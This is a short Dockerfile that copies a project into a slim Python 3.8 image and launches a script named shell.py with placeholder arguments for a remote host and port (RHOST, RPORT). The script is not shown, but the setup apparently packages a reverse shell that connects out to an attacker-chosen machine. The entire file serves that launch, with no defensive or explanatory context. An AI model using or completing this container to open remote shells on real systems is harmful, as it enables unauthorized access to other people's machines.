FROM python:3.8-slim-buster

COPY . .

CMD ["python3", "shell.py", "%SET RHOST HERE%", "%SET RPORT HERE%"]
